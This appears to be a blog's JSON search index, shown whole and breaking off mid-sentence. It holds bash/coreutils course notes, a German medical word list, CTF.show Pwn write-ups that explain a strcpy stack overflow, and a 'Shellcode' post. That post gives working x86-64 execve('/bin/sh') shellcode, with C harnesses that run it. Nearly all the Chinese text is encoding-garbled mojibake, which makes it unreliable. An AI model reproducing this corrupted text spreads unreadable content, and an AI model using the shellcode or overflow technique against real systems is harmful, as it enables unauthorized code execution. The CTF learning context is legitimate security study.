stdoutï¼Œ2â€”æ ‡å‡†é”™è¯¯ stderrã€‚ æŠŠ command çš„é”™è¯¯æµé‡å®šå‘åˆ°ç©ºè®¾å¤‡ /dev/nullï¼ˆåƒâ€œé»‘æ´â€ä¸€æ ·ï¼Œä¼šä¸¢å¼ƒè¾“å…¥ï¼‰ã€‚ è¯»å–æ–‡ä»¶ï¼ˆReading Filesï¼‰ï¼š cat è¯»å–å•ä¸ªæ–‡ä»¶ï¼š 1cat file è¿æ¥å¤šä¸ªæ–‡ä»¶ï¼š 1cat file1 file2 file3 æ¥å—ç®¡é“è¾“å…¥ï¼š 1command | cat è½¬ä¹‰/å¯è§†åŒ–äºŒè¿›åˆ¶æ•°æ®ï¼š 1cat -v binaryfile å¤„ç†å‹ç¼©æ–‡ä»¶ï¼š 1zcat / bzcat / xzcat ä¸»è¦ç”¨ä½œå…¶ä»–å‘½ä»¤çš„è¾“å…¥ åˆ†é¡µæŸ¥çœ‹ç»“æœï¼ˆPaging reultsï¼‰ï¼šless ç”¨äºæ£€æŸ¥ç»“æœæˆ–æ–‡ä»¶ï¼Œåˆ†é¡µæ˜¾ç¤ºï¼Œå¯å‘å‰å‘åæ»šåŠ¨ã€‚ åœ¨ç®¡é“ä¸­é€šå¸¸ç”¨ä½œæœ€åä¸€ä¸ªå‘½ä»¤ã€‚ åˆ†é¡µå‘½ä»¤è¾“å‡ºï¼š 1command | less åˆ†é¡µæŸ¥çœ‹æ–‡ä»¶ï¼š 1less file æˆªæ–­é•¿è¡Œï¼š 1less -S è¿‡æ»¤ï¼ˆFilteringï¼‰ï¼šgrep è¿”å›æ‰€æœ‰åŒ¹é…è¡Œâ€”â€”åŠŸèƒ½å¼ºå¤§ã€é€‰é¡¹ä¼—å¤šã€‚ è¿‡æ»¤è¾“å…¥ï¼š 1cat file1 file2 | grep &#x27;img[0-9]*\\.jpg&#x27; è¿‡æ»¤æ–‡ä»¶ï¼š 1grep &#x27;img[0-9]*\\.jpg&#x27; *.html åªè¿”å›åŒ¹é…ç‰‡æ®µï¼š 1command | grep -o &#x27;user=.*$&#x27; è¿”å›ä¸åŒ¹é…çš„è¡Œï¼š 1grep -v &#x27;^warning&#x27; logfile ä¸åŒºåˆ†å¤§å°å†™ï¼š 1cat file | grep -i &#x27;\\.jpg&#x27; file æ’åºï¼ˆSortingï¼‰ï¼šsort æŒ‰æŸç§å‡†åˆ™å¯¹è¾“å…¥æ’åºï¼š åŸºæœ¬æ’åºï¼š 1cat file | sort æ•°å­—æ’åºï¼š 1cat file | sort -n æŒ‰ç‰¹å®šé”®æ’åºï¼š 1cat file | sort -k 2 ä»¥ç¬¬ 2 åˆ—å¼€å§‹ç›´åˆ°è¡Œå°¾ä½œä¸ºæ’åºé”®è¿›è¡Œæ’åºï¼ˆé»˜è®¤å­—å…¸åºï¼Œå‡åºï¼ŒæŒ‰ç©ºç™½åˆ†éš”åˆ—ï¼›å¤šä¸ªç©ºæ ¼/Tab ä¼šè¢«åˆå¹¶ä¸ºä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œå‰å¯¼ç©ºç™½è¢«å¿½ç•¥ï¼‰ã€‚ æŒ‡å®šåˆ†éš”ç¬¦æ’åºï¼š 1cat file | sort -t &#x27;,&#x27; -k 3 æŠŠé€—å·å½“ä½œåˆ—åˆ†éš”ç¬¦ï¼Œç”¨ä»ç¬¬3åˆ—åˆ°è¡Œå°¾çš„å†…å®¹æŒ‰å­—å…¸åºæ’åºã€‚ æ’åºå¹¶å»é‡ï¼š 1cat file | sort -u éå¸¸å¼ºå¤§ä¸”æœ‰ç”¨ èƒ½å¤„ç†å¤§äºå†…å­˜çš„æ–‡ä»¶ å·²æ’åºçš„æ–‡ä»¶å¯ä½œä¸ºå…¶ä»–ç®—æ³•çš„è¾“å…¥ é€‰å‰/åç¼€ï¼ˆSelecting Prefix/Sufixï¼‰ï¼šhead / tail è¿”å›æ–‡ä»¶å¼€å¤´/ç»“å°¾ï¼š å‰ 20 æ¡ï¼š 1head -20 file 1sort file | head -20 è¿™ä¸¤æ¡å‘½ä»¤çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ å 15 æ¡ï¼š 1sort file | tail -15 é™¤å‰ä¸¤æ¡å¤–çš„å…¨éƒ¨ï¼š 1sort file | tail -n +3 é™¤æœ€åä¸¤æ¡å¤–çš„å…¨éƒ¨ï¼š 1sort file | head -n -2 è¿™äº›éƒ½æ˜¯top-kæŸ¥è¯¢â€”â€”å…ˆæ’åºå† head/tailã€‚ ä¹Ÿå¯ç”¨äºæœ€å°/æœ€å¤§å€¼è®¡ç®—ã€‚ å¤„ç†é‡å¤ï¼ˆHandling Duplicatesï¼‰ï¼šuniq å¤„ç†å·²æ’åºè¾“å…¥ä¸­çš„é‡å¤ï¼š å»é‡ï¼š 1sort file | uniq è®¡æ•°é‡å¤ï¼š 1sort file | uniq -c ä»…è¿”å›é‡å¤è¡Œï¼š 1sort file | uniq -d ä»…è¿”å›å”¯ä¸€è¡Œï¼š 1sort file | uniq -u å¯¹åˆ†ç»„ä¸è®¡æ•°å¾ˆæœ‰ç”¨ æŠ•å½±åˆ—ï¼ˆProjection Columnsï¼‰ï¼šcut è¯­æ³•ï¼š 1cut OPTION... [FILE]... åªè¿”å›è¾“å…¥ä¸­ç›¸å…³éƒ¨åˆ†ï¼š è¿”å›ç‰¹å®šå­—æ®µï¼š 1cat file | cut -f 1,3 æŒ‡å®šåˆ†éš”ç¬¦åˆ‡åˆ†ï¼š 1cat file | cut -f 2-4 -d &#x27;,&#x27; æŒ‰å­—ç¬¦ä½ç½®åˆ‡åˆ†ï¼š 1cat file | cut -c 1-10 è®¡æ•°ï¼ˆCountingï¼‰ï¼šwc ç»Ÿè®¡è¡Œ/è¯/å­—ç¬¦æ•°é‡ï¼š å…¨é‡ç»Ÿè®¡ï¼š 1cat file | wc åªæ•°è¡Œæ•°ï¼š 1cat file | wc -l åªæ•°å­—èŠ‚æ•°ï¼š 1cat file | wc -c æœ‰åŠ©äºæ”¶é›†æ•°æ®ç»Ÿè®¡ã€‚ ä¹±åºï¼ˆShufflingï¼‰ï¼šshuf å°†è¾“å…¥çš„è¡Œæ‰“ä¹±ç”Ÿæˆéšæœºæ’åˆ—ï¼š éšæœºé¡ºåºï¼š 1cat file | shuf ä¸å¤ªå¸¸ç”¨ï¼Œä½†åœ¨æŸäº›åœºæ™¯å¾ˆæœ‰ç”¨ï¼š éšæœºæŠ½æ ·ï¼š 1cat file | shuf | head -10000 é€‚åˆæ€§èƒ½æµ‹è¯•ã€‚ ç¼–è¾‘æ–‡æœ¬ï¼ˆEditing Textï¼‰ï¼šsed è¯­æ³•ï¼š 1sed &#x27;s/regex/repl/flags&#x27; s æ˜¯ substituteï¼ˆæ›¿æ¢ï¼‰çš„æ„æ€ã€‚ ç¬¬ 1 ä¸ªåˆ†éš”ç¬¦åæ˜¯æ­£åˆ™ï¼ˆè¦åŒ¹é…çš„å†…å®¹ï¼‰ï¼Œç¬¬ 2 ä¸ªåˆ†éš”ç¬¦åæ˜¯æ›¿æ¢æ–‡æœ¬ï¼Œæœ€åæ˜¯æ ‡å¿—ä½ï¼ˆå¯é€‰ï¼‰ã€‚ é»˜è®¤æ¯è¡Œåªæ›¿æ¢ç¬¬ 1 å¤„åŒ¹é…ï¼›åŠ  g æ‰æ˜¯â€œæœ¬è¡Œå…¨æ›¿â€ã€‚ &amp; åœ¨æ›¿æ¢æ–‡æœ¬é‡Œè¡¨ç¤ºâ€œæ•´æ®µåŒ¹é…çš„å†…å®¹â€ï¼›\\1ã€\\2â€¦ è¡¨ç¤ºæ•è·ç»„ã€‚ sed çš„é»˜è®¤æ­£åˆ™æ˜¯ BREï¼ˆBasic Regular Expressionsï¼‰ï¼šåˆ†ç»„è¦å†™ \\( \\)ï¼›å¦‚æœç”¨ -Eï¼ˆæˆ– GNU -rï¼‰ï¼Œå°±å˜æˆ ERE åˆ†ç»„å¯ç”¨ ( )ã€‚ ç”¨ä¸€ä¸ªæ–‡æœ¬æ›¿æ¢å¦ä¸€ä¸ªæ–‡æœ¬ï¼š åŸºæœ¬æ›¿æ¢ï¼š 123cat file | sed &#x27;s/oldText/newText/&#x27;sed &#x27;s/oldText/newText/&#x27; file å¯¹æ¯ä¸€è¡Œï¼ŒæŠŠç¬¬ä¸€æ¬¡å‡ºç°çš„ oldText æ›¿æ¢æˆ newTextã€‚åªå½±å“æ¯è¡Œç¬¬ä¸€ä¸ªåŒ¹é…ï¼Œåé¢çš„åŒä¸€è¡ŒåŒ¹é…ä¿æŒä¸å˜ã€‚ æ›¿æ¢æ‰€æœ‰å‡ºç°ï¼š 1cat file | sed &#x27;s/oldText/newText/g&#x27; åå‘å¼•ç”¨ï¼š 1cat file | sed &#x27;s/IMG_\\([0-9]*\\).JPG/image\\1.jpg/g&#x27; æŠŠè¯¸å¦‚ IMG_123.JPG è½¬ä¸º image123.jpgã€‚ IMG_ï¼šå­—é¢åŒ¹é…ã€‚ \\([0-9]*\\)ï¼šæ•è·ç»„ï¼ˆå› ä¸ºæ˜¯ BRE è¦å†™ \\( \\)ï¼‰ã€‚åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼›åŒ¹é…åˆ°çš„æ•°å­—è¢«è®°ä¸ºç»„ 1ã€‚ æ›¿æ¢ä¸² image\\1.jpgï¼šæŠŠç»„ 1ï¼ˆå³æ•°å­—ï¼‰æ’å›å»ã€‚ gï¼šè¯¥è¡Œæ‰€æœ‰åŒ¹é…éƒ½æ›¿æ¢ã€‚ ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…ï¼š 1cat file | sed &#x27;s/file[0-9]*.png/&quot;&amp;&quot;/I&#x27; ä½¿ç”¨å¤šä¸ªè§„åˆ™ï¼š 1cat file | sed -e &#x27;s/old1/new1/&#x27; -e &#x27;s:a/b:a_b:&#x27; æå…¶å¼ºå¤§ä¸”æœ‰ç”¨ï¼› è¿˜æœ‰åˆ†ç»„ã€æ¡ä»¶åˆ†æ”¯ç­‰æ›´å¤šç‰¹æ€§ï¼Œä½†å¾ˆå°‘ç”¨ã€‚ åˆå¹¶æ–‡ä»¶ï¼ˆCombining Filesï¼‰ï¼šjoin åˆå¹¶å·²æ’åºè¾“å…¥æ–‡ä»¶ï¼š æŒ‰å…¬å…±å­—æ®µåˆå¹¶ä¸¤ä¸ªæ–‡ä»¶ï¼š 1join -1 2 -2 1 file1 file2 ç”¨ file1 çš„ç¬¬2åˆ—ä¸ file2 çš„ç¬¬1åˆ—ä½œä¸ºâ€œé”®â€åšå†…è¿æ¥ -1 2ï¼šæŒ‡å®š file1 çš„é”®åˆ—æ˜¯ç¬¬ 2 åˆ—ã€‚ -2 1ï¼šæŒ‡å®š file2 çš„é”®åˆ—æ˜¯ç¬¬ 1 åˆ—ã€‚ æ²¡æœ‰æŒ‡å®šåˆ†éš”ç¬¦ â‡’ ç”¨ç©ºç™½åˆ‡åˆ—ï¼›å¤šä¸ªç©ºç™½ç®—ä¸€ä¸ªåˆ†éš”ï¼›å‰å¯¼ç©ºç™½è¢«å¿½ç•¥ã€‚ æ²¡æœ‰ -a/-v â‡’ å†…è¿æ¥ï¼ˆä»…è¾“å‡ºä¸¤è¾¹éƒ½å‡ºç°çš„é”®ï¼‰ã€‚ æŒ‡å®šåˆ†éš”ç¬¦åˆå¹¶ï¼š 1join -1 2 -2 1 -d &#x27;,&#x27; file1 file2 ä¿ç•™æœªåŒ¹é…è¡Œï¼ˆ-aï¼‰ï¼š 1join -1 2 -2 1 -a 1 file1 file2 è¡Œä¸ºç±»ä¼¼å…³ç³»å‹è¿æ¥ï¼›ä½†å¦‚æœéœ€è¦æ›´å¼ºåŠŸèƒ½ï¼Œå¯èƒ½åº”ä½¿ç”¨æ›´å¼ºå¤§çš„å·¥å…·ã€‚ é€‰é¡¹è¯´æ˜ï¼š -1 FIELDï¼šfile1 ä»¥è¯¥å­—æ®µè¿æ¥ï¼›-2 FIELDï¼šfile2 ä»¥è¯¥å­—æ®µè¿æ¥ -a 1 å·¦å¤–è¿æ¥ï¼›-a 2 å³å¤–è¿æ¥ï¼›-a 1 -a 2 å…¨å¤–è¿æ¥ -v æŠ‘åˆ¶å·²è¿æ¥çš„è¾“å‡ºè¡Œï¼š-v 1 å·¦åè¿æ¥ï¼›-v 2 å³åè¿æ¥ è®¡ç®—ï¼ˆComputationï¼‰ï¼šawk ä¸ºè¾“å…¥çš„æ¯ä¸€è¡Œæ‰§è¡Œç¨‹åºï¼š é€šç”¨ç»“æ„ï¼š 1awk &#x27;BEGIN&#123;init&#125;&#123;per-line&#125;END&#123;done&#125;&#x27; file è®¡æ•°è¡Œæ•°ï¼š 1awk &#x27;BEGIN&#123;x=0&#125;&#123;x=x+1&#125;END&#123;print x&#125;&#x27; ç´¯åŠ æŸåˆ—ï¼š 1awk &#x27;BEGIN&#123;x=0&#125;&#123;x=x+$2&#125;END&#123;print x&#125;&#x27; æ±‚æŸåˆ—å¹³å‡ï¼š 1awk &#x27;BEGIN&#123;x=0;y=0&#125;&#123;x+=\\$2;y+=1&#125;END&#123;print x/y&#125;&#x27; æ¡ä»¶ï¼š 1awk &#x27;BEGIN&#123;x=0&#125;&#123;if ($1&gt;10) x+=\\$2&#125;END&#123;print x&#125;&#x27;","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Data Engeneering","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Data-Engeneering","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Data-Engeneering/"}],"tags":[{"name":"Data Engeneering","slug":"Data-Engeneering","permalink":"https://archer-baiyi.github.io/tags/Data-Engeneering/"},{"name":"bash","slug":"bash","permalink":"https://archer-baiyi.github.io/tags/bash/"},{"name":"GNU Coreutils","slug":"GNU-Coreutils","permalink":"https://archer-baiyi.github.io/tags/GNU-Coreutils/"}]},{"title":"Shellcode","slug":"CTF/Pwn/Shellcode","date":"2025-10-15T19:35:20.000Z","updated":"2025-10-15T19:37:51.286Z","comments":true,"path":"2025/10/15/CTF/Pwn/Shellcode/","permalink":"https://archer-baiyi.github.io/2025/10/15/CTF/Pwn/Shellcode/","excerpt":"å„ç§Shellcode","text":"1123456789sc = asm(&quot;&quot;&quot; xor rsi, rsi xor rdx, rdx mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp mov al, 59 syscall&quot;&quot;&quot;) æ¥æºï¼šChatGPT 224ä½çš„shellcodeï¼ˆæ¥æºï¼šhttps://www.exploit-db.com/exploits/43550 ï¼‰ï¼š 1234567891011121314151617181920212223242526272829/*global _startsection .text_start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall*/#include &lt;stdio.h&gt;#include &lt;string.h&gt;char code[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;// char code[] = &quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;;int main()&#123; printf(&quot;len:%d bytes\\n&quot;, strlen(code)); (*(void(*)()) code)(); return 0;&#125; 323ä½çš„shellcodeï¼ˆæ¥æºï¼šhttps://www.exploit-db.com/exploits/36858 ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/* # # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes) # # Dying to be the shortest. # # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com) # # 27 April 2015 # # GPL # .global _start_start: # char *const argv[] xorl %esi, %esi # &#x27;h&#x27; &#x27;s&#x27; &#x27;/&#x27; &#x27;/&#x27; &#x27;n&#x27; &#x27;i&#x27; &#x27;b&#x27; &#x27;/&#x27; movq $0x68732f2f6e69622f, %rbx # for &#x27;\\x00&#x27; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall *//* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */#include &lt;stdio.h&gt;#include &lt;string.h&gt;intmain(void)&#123; char *shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56&quot; &quot;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;; printf(&quot;strlen(shellcode)=%d\\n&quot;, strlen(shellcode)); ((void (*)(void))shellcode)(); return 0;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Shellcode","slug":"Shellcode","permalink":"https://archer-baiyi.github.io/tags/Shellcode/"}]},{"title":"åŒ»å­¦å¸¸ç”¨å¾·è¯­å•è¯","slug":"æ‚/åŒ»å­¦å¸¸ç”¨å¾·è¯­å•è¯","date":"2025-10-06T20:49:57.000Z","updated":"2025-10-20T18:49:22.465Z","comments":true,"path":"2025/10/06/æ‚/åŒ»å­¦å¸¸ç”¨å¾·è¯­å•è¯/","permalink":"https://archer-baiyi.github.io/2025/10/06/%E6%9D%82/%E5%8C%BB%E5%AD%A6%E5%B8%B8%E7%94%A8%E5%BE%B7%E8%AF%AD%E5%8D%95%E8%AF%8D/","excerpt":"","text":"ç—‡çŠ¶ ä¸­ å¾· ç—° Der Schleim ç‚ç—‡ EntzÃ¼ndung éƒ¨ä½ ä¸­ å¾· æ‰æ¡ƒä½“ Die Mandel è¯ ä¸­ å¾· å¸ƒæ´›èŠ¬ Ibuprofen","categories":[{"name":"æ‚","slug":"æ‚","permalink":"https://archer-baiyi.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"å¾·è¯­ï¼ŒåŒ»è¯","slug":"å¾·è¯­ï¼ŒåŒ»è¯","permalink":"https://archer-baiyi.github.io/tags/%E5%BE%B7%E8%AF%AD%EF%BC%8C%E5%8C%BB%E8%8D%AF/"}]},{"title":"CTF.show Pwnå…¥é—¨","slug":"CTF/Pwn/CTF-show-Pwnå…¥é—¨","date":"2025-10-04T18:16:54.000Z","updated":"2025-10-29T20:44:58.083Z","comments":true,"path":"2025/10/04/CTF/Pwn/CTF-show-Pwnå…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"å‰ç½®åŸºç¡€Pwn5 å…ˆæŸ¥çœ‹æ–‡ä»¶ï¼Œå‘ç°æ˜¯elfæ–‡ä»¶ï¼Œç„¶åç»™å®ƒåŠ ä¸Šè¿è¡Œæƒé™å¹¶è¿è¡Œå®ƒã€‚ï¼ˆæ³¨æ„ï¼Œåœ¨Linuxä¸­è¿™ç§å¤–æ¥æ–‡ä»¶å¦‚æœä¸ä¸“é—¨æ·»åŠ è¿è¡Œæƒé™æˆ‘ä»¬æ˜¯æ— æ³•è¿è¡Œå®ƒçš„ã€‚ï¼‰ 1234567â””â”€$ file Welcome_to_CTFshowWelcome_to_CTFshow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, strippedâ””â”€$ chmod +x Welcome_to_CTFshowâ””â”€$ ./Welcome_to_CTFshowWelcome_to_CTFshow_PWN æ‰€ä»¥flagä¸ºï¼š 1ctfshow&#123;Welcome_to_CTFshow_PWN&#125; Pwn6 æˆ‘ä»¬å…ˆæ¥ä»”ç»†åœ°çœ‹ä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼ˆåˆ©ç”¨IDAçš„åç¼–è¯‘ï¼‰ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public start ; å£°æ˜å…¥å£ç¬¦å· startï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰start proc near mov eax, 0Bh ; EAX = 0Bh (åè¿›åˆ¶ 11) add eax, 1BF48h ; EAX = EAX + 0x1BF48 ï¼ˆå³ EAX = 0x1BF48 + 11ï¼‰ sub eax, 1 ; EAX = EAX - 1 mov ebx, 36Dh ; EBX = 0x36D (åè¿›åˆ¶ 877) mov edx, ebx ; EDX = EBX = 0x36D mov ecx, dword ptr aWelcomeToCtfsh ; ECX = å†…å­˜ä¸­å­˜æ”¾çš„å­—ç¬¦ä¸²åœ°å€å‰ 4 å­—èŠ‚ ; è¿™å…¶å®ä¼šæŠŠå­—ç¬¦ä¸² â€œWelcome_to_CTFshow_PWNâ€ çš„å‰å››ä¸ªå­—èŠ‚å½“ä½œæ•´æ•°åŠ è½½ mov esi, offset aWelcomeToCtfsh ; ESI = &quot;Welcome_to_CTFshow_PWN&quot; çš„åœ°å€ mov eax, [esi] ; EAX = å‰ 4 ä¸ªå­—èŠ‚ (å³ &quot;Welc&quot;) mov ecx, offset aWelcomeToCtfsh ; å†æ¬¡å°† ECX ç½®ä¸ºå­—ç¬¦ä¸²åœ°å€ add ecx, 4 ; ECX = ECX + 4ï¼Œè·³è¿‡å‰ 4 å­—èŠ‚ (&quot;Welc&quot;) mov eax, [ecx] ; EAX = ä¸‹ä¸€ä¸ª 4 å­—èŠ‚ (&quot;ome_&quot;) mov ecx, offset aWelcomeToCtfsh ; å†æ¬¡è£…å…¥å­—ç¬¦ä¸²åœ°å€ mov edx, 2 mov eax, [ecx+edx*2] ; EAX = [aWelcome_to_CTFshow_PWN + 4]ï¼Œæ•ˆæœç±»ä¼¼ä¸Šä¸€æ­¥ mov ecx, offset aWelcomeToCtfsh mov edx, 1 add ecx, 8 mov eax, [ecx+edx*2-6] ; è¿™äº›å¤šæ¬¡ mov çš„æ“ä½œéƒ½æ˜¯å†—ä½™çš„ï¼Œå¯èƒ½æ˜¯æ•…æ„æ··æ·†æˆ–å¹²æ‰°åæ±‡ç¼–é˜…è¯» ; å®é™…å¯¹æœ€ç»ˆè¾“å‡ºæ²¡æœ‰å½±å“ ; --- ä»¥ä¸‹æ˜¯çœŸæ­£æœ‰æ„ä¹‰çš„ä»£ç éƒ¨åˆ† --- mov eax, 4 ; ç³»ç»Ÿè°ƒç”¨å· 4ï¼šsys_write mov ebx, 1 ; æ–‡ä»¶æè¿°ç¬¦ 1ï¼šstdout mov ecx, offset aWelcomeToCtfsh ; ECX = è¦è¾“å‡ºçš„å­—ç¬¦ä¸²åœ°å€ mov edx, 16h ; EDX = è¦å†™çš„é•¿åº¦ï¼ˆ0x16 = 22 å­—èŠ‚ï¼‰ int 80h ; è°ƒç”¨å†…æ ¸ï¼šwrite(1, &quot;Welcome_to_CTFshow_PWN&quot;, 22) mov eax, 1 ; ç³»ç»Ÿè°ƒç”¨å· 1ï¼šsys_exit xor ebx, ebx ; EBX = 0ï¼ˆé€€å‡ºçŠ¶æ€ç  0ï¼‰ int 80h ; è°ƒç”¨å†…æ ¸ï¼šexit(0)start endp_text ends å®šä¹‰:ç«‹å³å¯»å€ï¼ˆImmediate Addressingï¼‰æ˜¯æŒ‡ï¼šæŒ‡ä»¤ä¸­çš„æ“ä½œæ•°æœ¬èº«å°±æ˜¯å¸¸é‡ï¼ˆç«‹å³æ•°ï¼‰ï¼Œè¯¥å¸¸é‡ç›´æ¥ç¼–ç åœ¨æŒ‡ä»¤å†…ï¼ŒCPU å–å‡ºæŒ‡ä»¤å³å¯å¾—åˆ°è¯¥å€¼ï¼Œæ— éœ€å†è®¿é—®å¯„å­˜å™¨æˆ–å†…å­˜å–æ•°ã€‚ è¿™æ®µä»£ç ä¸­ç«‹å³å¯»å€çš„éƒ¨åˆ†æ˜¯ï¼š 12345mov eax, 0Bhadd eax, 1BF48hsub eax, 1mov ebx, 36Dh ; è¿™è¡Œè·Ÿeaxæ²¡æœ‰å…³ç³»ï¼Œæ‰€ä»¥å¯ä»¥å¿½ç•¥ã€‚ 0Bhï¼Œ1BF48hçš„héƒ½æ˜¯åå…­è¿›åˆ¶çš„åç¼€ï¼Œæ‰€ä»¥è¿™æ®µå†…å®¹ç›¸å½“äºï¼š 12345eax = 0x0000000Beax += 0x0001BF48 # =0x0001BF53eax -= 1 # =0x0001BF52=114514 æ‰€ä»¥flagä¸ºï¼š 1ctfshow&#123;114514&#125; æ ˆæº¢å‡ºPwn35 æ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æªæ–½ï¼š 12345678â””â”€$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 1234567891011121314151617$ lspwnme$ ./pwnme â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„â–„â–„â–„â–„â–„â–„ â–„â–„ â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€ â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆ â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„ â–€ â–ˆâ–ˆâ–€ â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–€â–ˆ â–ˆâ–ˆ â–ˆâ–€ â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–€â–€â–€â–ˆâ–ˆâ–„ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆ â–ˆâ–ˆâ–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€â–€â–€ â–€â–€ â–€â–€ â–€â–€â–€â–€ â–€â–€ â–€â–€ * ************************************* * Classify: CTFshow --- PWN --- å…¥é—¨ * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : See what the program does! * *************************************Where is flag? çœ‹ä¸€ä¸‹è¿™ä¸ªctfshowå‡½æ•°ï¼š 123456char *__cdecl ctfshow(char *src)&#123; char dest[104]; // [esp+Ch] [ebp-6Ch] BYREF return strcpy(dest, src);&#125; ä¸éš¾å‘ç°å¸¸è§çš„æ¼æ´å‡½æ•°strcpyï¼Œä½†è¯¥æ€ä¹ˆåˆ©ç”¨å®ƒå‘¢ï¼Ÿ æ³¨æ„åˆ°è¿™ä¸€è¡Œï¼š 1signal(11, (__sighandler_t)sigsegv_handler); 123456void __noreturn sigsegv_handler()&#123; fprintf(stderr, &quot;%s\\n&quot;, flag); fflush(stderr); exit(1);&#125; signal(11, (__sighandler_t)sigsegv_handler); 11 æ˜¯ POSIX ä¿¡å·å· SIGSEGVï¼ˆæ®µé”™è¯¯ / segmentation faultï¼‰ã€‚ signal(signum, handler) ç”¨æ¥æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°ï¼šå½“è¿›ç¨‹æ”¶åˆ° signum ä¿¡å·æ—¶ï¼Œå†…æ ¸ä¼šä¸­æ–­å½“å‰æ‰§è¡Œæµå¹¶è·³åˆ° handlerã€‚ è¿™é‡ŒæŠŠ sigsegv_handler æ³¨å†Œä¸º SIGSEGV çš„å¤„ç†å™¨ â€”â€” å½“ç¨‹åºå‘ç”Ÿæ®µé”™è¯¯ï¼ˆä¾‹å¦‚éæ³•å†…å­˜è®¿é—®æˆ–è®¿é—®ä¿æŠ¤é¡µï¼‰æ—¶ä¸ä¼šæŒ‰é»˜è®¤è¡Œä¸ºç»ˆæ­¢å¹¶æ‰“å° coreï¼Œè€Œæ˜¯å»æ‰§è¡Œè¿™ä¸ªè‡ªå®šä¹‰å¤„ç†å‡½æ•°ã€‚ (__sighandler_t) æ˜¯ä¸€ä¸ªç±»å‹è½¬æ¢ï¼ŒæŠŠ sigsegv_handler å¼ºåˆ¶è½¬ä¸º signal æœŸå¾…çš„å‡½æ•°æŒ‡é’ˆç±»å‹ï¼Œä»¥é¿å…ç¼–è¯‘å™¨ç±»å‹ä¸åŒ¹é…çš„è­¦å‘Šï¼ˆé€šå¸¸ signal è¦æ±‚ç‰¹å®šç­¾å void (*)(int)ï¼Œè€Œè¿™é‡Œ handler å®šä¹‰ä¸å¸¦å‚æ•°ï¼Œæ‰€ä»¥åšäº† castï¼‰ã€‚ fprintf(stderr, &quot;%s\\n&quot;, flag); æŠŠå…¨å±€æˆ–å¤–éƒ¨å˜é‡ flag å½“ä½œå­—ç¬¦ä¸²ï¼Œå†™åˆ°æ 